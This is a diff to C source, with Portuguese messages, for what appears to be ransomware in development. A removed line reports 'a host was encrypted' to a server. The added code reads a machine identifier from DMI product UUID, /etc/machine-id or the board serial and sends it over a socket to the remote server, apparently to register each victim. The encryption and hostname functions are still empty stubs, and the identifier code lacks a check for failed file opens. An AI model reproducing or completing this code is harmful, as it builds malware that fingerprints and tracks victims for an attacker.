@@ -53,10 +53,10 @@ void WhatIsDir(char *dir_sch){
 	}
 	closedir(diretorio);
 }
-void connectserver(){
+void connectserver(char *uuid){
 	int sockfd;
 	int status;
-	char buffer[100] = "[INFO]: UM HOST FOI CRIPTOGRAFADO :]\n";
+	printf("%s", uuid);
 	struct sockaddr_in my_addr = {
 		.sin_family = AF_INET,
 		.sin_port = htons(myport),
@@ -71,13 +71,52 @@ void connectserver(){
 	if(status < 0){
 		printf("[INFO]: Ocorreu um erro ao tentar se connectar ao servidor!");
 	}
-	send(sockfd, buffer, sizeof(buffer), 0);
+	if( (send(sockfd, uuid, strlen(uuid), 0)) < 0){
+		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");
+	}
 }
 
 void encryptfile(char *name_dir){
 	//int len = sizeof(getdir->d_name);
 
-	
+}
+
+char *getuuid(){
+	FILE *uuid;
+	char id[140];
+	char *status;
+	char type[30];
+	char *completeid;
+
+	completeid = malloc(sizeof(char)*160);
+	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
+
+	memcpy(&type, "product_uuid", sizeof(type));
+
+	if(uuid == NULL){
+
+		memset(type, '\0', sizeof(type));
+		memcpy(&type, "machine-id", sizeof(type));
+		uuid = fopen("/etc/machine-id", "r");
+
+		if(uuid == NULL){
+
+			memset(type, '\0', sizeof(type));
+			memcpy(&type, "board_serial", sizeof(type));
+			uuid = fopen("/sys/class/dmi/id/board_serial", "r");
+		}
+
+	}
 
 	
+	status = fgets(id, sizeof(id), uuid);
+	
+	sprintf(completeid, "%s: %s", type, id);
+
+	return completeid;
+	
+}
+
+char *getpcname(){
+
 }
